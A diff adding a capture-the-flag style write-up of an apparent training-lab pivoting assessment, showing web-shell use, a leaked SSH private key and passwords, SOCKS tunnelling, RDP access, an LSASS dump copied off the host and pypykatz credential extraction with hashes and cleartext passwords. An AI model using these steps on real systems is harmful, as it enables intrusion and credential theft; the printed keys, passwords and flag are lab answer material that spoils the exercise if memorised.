@@ -4379,13 +4379,776 @@ Volume in drive C has no label.
 
 </td>
 </tr>
+</table>
 
 </details>
+
+</details>
+
+---
+
+<details>
+<summary><h1>🧠 Skill Assessment</h1></summary>
+
+**Scenario**
+
+A team member started a Penetration Test against the Inlanefreight environment but was moved to another project at the last minute. Luckily for us, they left a web shell in place for us to get back into the network so we can pick up where they left off. We need to leverage the web shell to continue enumerating the hosts, identifying common services, and using those services/protocols to pivot into the internal networks of Inlanefreight. Our detailed objectives are below:
+
+**Objectives**
+
+- Start from external _(Pwnbox or your own VM)_ and access the first system via the web shell left in place.
+- Use the web shell access to enumerate and pivot to an internal host.
+- Continue enumeration and pivoting until you reach the **Inlanefreight Domain Controller** and capture the associated **flag**.
+- Use any **data**, **credentials**, **scripts**, or other information within the environment to enable your pivoting attempts.
+- Grab **any/all** flags that can be found.
+
+<details>
+<summary><h2>Steps</h2></summary>
+
+<details>
+<summary><h3>Step 1</h3></summary>
+
+**1.1 - Navigate to `http://10.129.229.129/`**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🌐 <b>WebShell — p0wny@shell</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`www-data@inlanefreight.local:/var/www/html#`**
+
+</td>
+<td>
+
+```bash
+ls -laR /home
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```text
+/home:
+total 16
+drwxr-xr-x  4 root          root          4096 Feb 21  2024 .
+drwxr-xr-x 19 root          root          4096 May  6  2022 ..
+drwxr-xr-x  2 administrator administrator 4096 Feb 21  2024 administrator
+drwxr-xr-x  4 webadmin      webadmin      4096 Feb 21  2024 webadmin
+
+/home/administrator:
+total 20
+drwxr-xr-x 2 administrator administrator 4096 Feb 21  2024 .
+drwxr-xr-x 4 root          root          4096 Feb 21  2024 ..
+-rw-r--r-- 1 administrator administrator  220 May  6  2022 .bash_logout
+-rw-r--r-- 1 administrator administrator 3771 May  6  2022 .bashrc
+-rw-r--r-- 1 administrator administrator  807 May  6  2022 .profile
+
+/home/webadmin:
+total 40
+drwxr-xr-x 4 webadmin webadmin 4096 Feb 21  2024 .
+drwxr-xr-x 4 root     root     4096 Feb 21  2024 ..
+-rw------- 1 webadmin webadmin 1372 Feb 21  2024 .bash_history
+-rw-r--r-- 1 webadmin webadmin  220 May  6  2022 .bash_logout
+-rw-r--r-- 1 webadmin webadmin 3771 May  6  2022 .bashrc
+drwx------ 2 webadmin webadmin 4096 Feb 21  2024 .cache
+-rw-r--r-- 1 webadmin webadmin  807 May  6  2022 .profile
+drwx--x--x 2 webadmin webadmin 4096 Feb 21  2024 .ssh
+-rw-r--r-- 1 root     root      163 May 16  2022 for-admin-eyes-only
+-rw-r--r-- 1 root     root     2622 May 16  2022 id_rsa
+ls: cannot open directory '/home/webadmin/.cache': Permission denied
+ls: cannot open directory '/home/webadmin/.ssh': Permission denied
+```
+
+</td>
+</tr>
+</table>
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🌐 <b>WebShell — p0wny@shell</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`www-data@inlanefreight.local:/var/www/html#`**
+
+</td>
+<td>
+
+```bash
+cat /home/webadmin/for-admin-eyes-only
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```text
+# note to self,
+in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
+with a password of :
+Plain Human work!
+```
+
+</td>
+</tr>
+</table>
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🌐 <b>WebShell — p0wny@shell</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`www-data@inlanefreight.local:/var/www/html#`**
+
+</td>
+<td>
+
+```bash
+cat /home/webadmin/id_rsa
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```text
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+```
+
+</td>
+</tr>
+</table>
+
+
+
+
+
+
 
 </details>
 
 <details>
-<summary><h1>🧠 Skill Assessment</h1></summary>
+<summary><h3>Step 2</h3></summary>
+
+**1.2 - Copy the contents to our attack box**
+
+**1.3 - Set restrictive permissions for the Private Key**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+chmod 600 id_rsa
+```
+
+</td>
+</tr>
+</table>
+
+</details>
+
+<details>
+<summary><h3>Step 3</h3></summary>
+
+**1.4 - Establish SSH Session with Dynamic Port Forwarding**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+ssh -i id_rsa -D 1080 webadmin@10.129.229.129
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+The authenticity of host '10.129.229.129 (10.129.229.129)' can't be established.
+ED25519 key fingerprint is SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY.
+This key is not known by any other names.
+...
+Last login: Wed Feb 21 08:13:15 2024
+webadmin@inlanefreight:~$
+```
+
+</td>
+</tr>
+</table>
+
+</details>
+
+<details>
+<summary><h3>Step 4</h3></summary>
+
+**1.5 - Internal Network Interface Enumeration**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`webadmin@inlanefreight:~$`**
+
+</td>
+<td>
+
+```bash
+ip add
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:b0:fb:19 brd ff:ff:ff:ff:ff:ff
+    inet 10.129.229.129/16 brd 10.129.255.255 scope global dynamic ens160
+       valid_lft 2582sec preferred_lft 2582sec
+    inet6 dead:beef::250:56ff:feb0:fb19/64 scope global dynamic mngtmpaddr
+       valid_lft 86398sec preferred_lft 14398sec
+    inet6 fe80::250:56ff:feb0:fb19/64 scope link
+       valid_lft forever preferred_lft forever
+3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:b0:73:48 brd ff:ff:ff:ff:ff:ff
+    inet 172.16.5.15/16 brd 172.16.255.255 scope global ens192
+       valid_lft forever preferred_lft forever
+    inet6 fe80::250:56ff:feb0:7348/64 scope link
+       valid_lft forever preferred_lft forever
+```
+
+</td>
+</tr>
+</table>
+
+> **NOTE:** The system is multihomed. Interface `ens192` exposes the internal subnet `172.16.5.0/16`, which is not reachable from the external network.
+
+**1.6 - Internal Host Discovery (Ping Sweep)**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`webadmin@inlanefreight:~$`**
+
+</td>
+<td>
+
+```bash
+for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "64 bytes" &); done
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.021 ms
+64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=3.38 ms
+```
+
+</td>
+</tr>
+</table>
+
+> **NOTE:** The ICMP response from host `172.16.5.35` returned a TTL of 128, which strongly suggests the target is a Windows-based system. In contrast, the local hop (`172.16.5.15`) returned a TTL of 64, typical of Linux distributions.
+
+</details>
+
+<details>
+<summary><h3>Step 5</h3></summary>
+
+**1.7 - Validate Proxychains Configuration**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🎯 <b>bash — Linux - Target</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`webadmin@inlanefreight:~$`**
+
+</td>
+<td>
+
+```bash
+tail -n 1 /etc/proxychains.conf
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+socks5 127.0.0.1 1080
+```
+
+</td>
+</tr>
+</table>
+
+**1.8 - Nmap Port Scanning via SOCKS Proxy**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+proxychains nmap -sT -Pn -n -p 22,80,135,139,445,3389 172.16.5.35
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-20 14:08 CST
+Nmap scan report for 172.16.5.35
+Host is up.
+
+PORT     STATE    SERVICE
+22/tcp   filtered ssh
+80/tcp   filtered http
+135/tcp  filtered msrpc
+139/tcp  filtered netbios-ssn
+445/tcp  filtered microsoft-ds
+3389/tcp filtered ms-wbt-server
+```
+
+</td>
+</tr>
+</table>
+
+> **NOTE:** `Nmap` scans returned false negatives (filtered state) likely due to aggressive timeout settings and multi-threading conflicts with the SOCKS proxy routing.
+
+**1.9 Internal Service Enumeration via SOCKS Proxy (Netcat Fallback)**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+for port in 22 80 135 139 445 3389; do proxychains nc -zv 172.16.5.35 $port 2>&1 | grep -i "OK"; done
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.5.35:22  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.5.35:135  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.5.35:139  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.5.35:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.5.35:3389  ...  OK
+```
+
+</td>
+</tr>
+</table>
+
+> **NOTE:** A manual TCP connection loop via netcat successfully bypassed this limitation, confirming active services on typical Windows ports (**SMB**, **RDP**, **RPC**).
+
+</details>
+
+<details>
+<summary><h3>Step 6</h3></summary>
+
+**1.10 RDP Session Establishment through SSH Tunnel**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /cert:ignore /dynamic-resolution /drive:kali_share,/tmp
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.5.35:3389  ...  OK
+```
+
+</td>
+</tr>
+</table>
+
+</details>
+
+<details>
+<summary><h3>Step 7</h3></summary>
+
+**1.11 - Post-Exploitation: Internal Host Flag Retrieval** 
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\System32 >`**
+
+</td>
+<td>
+
+```cmd
+type C:\Flag.txt
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```text
+S1ngl3-Piv07-3@sy-Day
+```
+
+</td>
+</tr>
+</table>
+
+</details>
+
+<details>
+<summary><h3>Step 8 - Exfiltrating LSASS Dump via RDP Shared Drive</h3></summary>
+
+In the RDP Session, go to Task Manager > Details > Right Click `lsass.exe` > *Create dump file* 
+
+```text
+The file has been successfully created
+
+The file is located at:
+C:\Users\mlefay\AppData\Local\Temp\lsass.DMP
+```
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\System32 >`**
+
+</td>
+<td>
+
+```cmd
+copy C:\Users\mlefay\AppData\Local\Temp\lsass.DMP \\tsclient\kali_share\
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```text
+ 1 file(s) copied.
+```
+
+</td>
+</tr>
+</table>
+
+</details>
+
+<details>
+<summary><h3>Step 9 - Extracting the credentials</h3></summary>
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+pypykatz lsa minidump /tmp/lsass.DMP
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+...
+== LogonSession ==
+
+authentication_id 162552 (27af8)
+session_id 0
+username vfrank
+domainname INLANEFREIGHT
+logon_server ACADEMY-PIVOT-D
+logon_time 2026-02-20T19:05:01.527040+00:00
+sid S-1-5-21-3858284412-1730064152-742000644-1103
+
+luid 162552
+	== MSV ==
+		Username: vfrank
+		Domain: INLANEFREIGHT
+		LM: NA
+		NT: 2e16a00be74fa0bf862b4256d0347e83
+		SHA1: b055c7614a5520ea0fc1184ac02c88096e447e0b
+		DPAPI: 97ead6d940822b2c57b18885ffcc5fb400000000
+	== WDIGEST [27af8]==
+		username vfrank
+		domainname INLANEFREIGHT
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: vfrank
+		Domain: INLANEFREIGHT.LOCAL
+		Password: Imply wet Unmasked!
+		password (hex)49006d0070006c0079002000770065007400200055006e006d00610073006b006500640021000000
+	== WDIGEST [27af8]==
+		username vfrank
+		domainname INLANEFREIGHT
+		password None
+		password (hex)
+	== DPAPI [27af8]==
+		luid 162552
+		key_guid 560f4286-76f2-4f0f-90a9-5135bbc0104f
+		masterkey 4fc3adb204f30f6a226f637b66be93811cee121eaed0e4ec2e8bc023d2d38d396e0c4e827aa49c6b1c2a58f6428ca725be027497ad10f8dd386d5926e7bf73b7
+		sha1_masterkey a3e3a61d9a74541a56c3a822d5470bedbb2d4fb5
+...
+```
+
+> **NOTE:** Analysis of the memory dump revealed that the user vfrank is vulnerable due to their credentials remaining stored in cleartext within the LSASS Kerberos authentication session.
+
+</td>
+</tr>
+</table>
+
+</details>
+
+<details>
+<summary><h3>Step 10 - Second Pivot Network Enumeration</h3></summary>
+
+<table width="100%">
+<tr>
+<td colspan="2"> 📟 <b>CMD — Windows</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\System32 >`**
+
+</td>
+<td>
+
+```cmd
+ipconfig
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```text
+Windows IP Configuration
+
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::2133:d27a:a64a:1fdb%4
+   IPv4 Address. . . . . . . . . . . : 172.16.5.35
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : 172.16.5.1
+
+Ethernet adapter Ethernet1 2:
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::49c5:f85d:308:f3d5%5
+   IPv4 Address. . . . . . . . . . . : 172.16.6.35
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . :
+```
+
+</td>
+</tr>
+<tr>
+<td width="20%">
+
+**`C:\System32 >`**
+
+</td>
+<td>
+
+```cmd
+for /L %i in (1,1,254) do @ping -n 1 -w 200 172.16.6.%i > nul && echo 172.16.6.%i is UP
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```text
+output
+```
+
+</td>
+</tr>
+</table>
+
+
+
+</details>
+
+</details>
 
 </details>
 
